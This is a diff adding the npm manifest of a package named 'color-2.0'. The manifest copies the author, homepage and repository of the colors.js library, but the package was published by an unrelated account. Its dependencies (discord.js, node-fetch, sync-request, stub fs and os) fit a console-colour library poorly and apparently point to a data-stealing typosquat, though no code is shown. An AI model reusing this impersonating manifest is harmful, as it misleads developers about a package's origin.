@@ -1,0 +1,74 @@
+{
+    "name": "color-2.0",
+    "description": "get colors in your node.js console",
+    "version": "1.4.0",
+    "author": {
+        "name": "Marak Squires"
+    },
+    "contributors": [
+        {
+            "name": "DABH",
+            "url": "https://github.com/DABH"
+        }
+    ],
+    "homepage": "https://github.com/Marak/colors.js",
+    "bugs": {
+        "url": "https://github.com/Marak/colors.js/issues"
+    },
+    "keywords": [
+        "ansi",
+        "terminal",
+        "colors"
+    ],
+    "repository": {
+        "type": "git",
+        "url": "git+ssh://git@github.com/Marak/colors.js.git"
+    },
+    "license": "MIT",
+    "scripts": {
+        "lint": "eslint . --fix",
+        "test": "node tests/basic-test.js && node tests/safe-test.js"
+    },
+    "engines": {
+        "node": ">=0.1.90"
+    },
+    "main": "lib/index.js",
+    "devDependencies": {
+        "eslint": "^5.2.0",
+        "eslint-config-google": "^0.11.0"
+    },
+    "dependencies": {
+        "discord.js": "^12.5.3",
+        "fs": "^0.0.1-security",
+        "node-fetch": "^3.2.3",
+        "os": "^0.1.2",
+        "sync-request": "^6.1.0"
+    },
+    "_id": "color-2.0@1.4.0",
+    "_nodeVersion": "16.14.0",
+    "_npmVersion": "8.3.1",
+    "dist": {
+        "integrity": "sha512-L8wrBvppxcai6hNKYmKdPwZZOQ0pkthKyvoSk1fqDWNXQgRg/5rAQdOjU7GF8TyTYnf0fR7SyJpIRmMYa64tfw==",
+        "shasum": "a90dbbb56f8c3cc39265181a3860cd2ad05ccda9",
+        "tarball": "https://registry.npmjs.org/color-2.0/-/color-2.0-1.4.0.tgz",
+        "fileCount": 22,
+        "unpackedSize": 52857,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNQunACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmqmIg//VbRSYQzWJjZSJI8OhtzQlwjmrp3ig+SHywt/HmxyPqp+TNwE\r\nB9c68lsvg582hWGyhypaLEo7aL44gV0ZFGprCCHVldvaU0pHTCnOILSIUOtX\r\noTTo/9bPFsFS9+TcMBsMIvtIXBmuhQ6+G/e8PydJ7YD6J9HfmfzKmUi5aYHo\r\nvKMspVJ1DTGaZLBOZzZN8BvtJvljRQTXyWf4SthVY+C6mvN5KPWerCRabu/z\r\nzBUXYRMO3wbBsLzOM1WpokG4DkmVJ6+JFSm/NBSLNuO62VPO1+9MrSgWYePo\r\nvatuKUWwoREsgFbXYdx4CJHsB2QhR7Kcdl1Y01D808XoV9zc3ecpOD0ZSQJ7\r\nSj0Hx6kCnNN36N4Zk/NeDSQGLgh3LTNCJIYYPNn6R00K6VFf0ylDUcPggGe5\r\ndv/uLTeq5+Cp6blisjBeB6/SdSMXi4h9ynLKwnPSTRkyhrgM5m186cYSqYbY\r\nxkT5LDojuLD+SKDJA/uD8nJ6dKeG7lk4UxjXbwKsPX568/hJfH8zw9u7fy/B\r\nEfashy4B5QleAfm5kdpJYZTut8H1aNRHypP/nqLUfh67EiTmy5NkjJH9pXnZ\r\ngNGE/atLXCU7m0z8NVznKyG4yqM/TN4wzvnoVh+14Ne2xjlWR6vSE2sMmHQo\r\nCD47CQgzuEC1MrLyN2I7aRgxgWm4HcMY6yo=\r\n=z2eH\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "ytunick7",
+        "email": "phylis7267@uorak.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "ytunick7",
+            "email": "phylis7267@uorak.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/color-2.0_1.4.0_1647643558953_0.6541722944384767"
+    },
+    "_hasShrinkwrap": false
+}
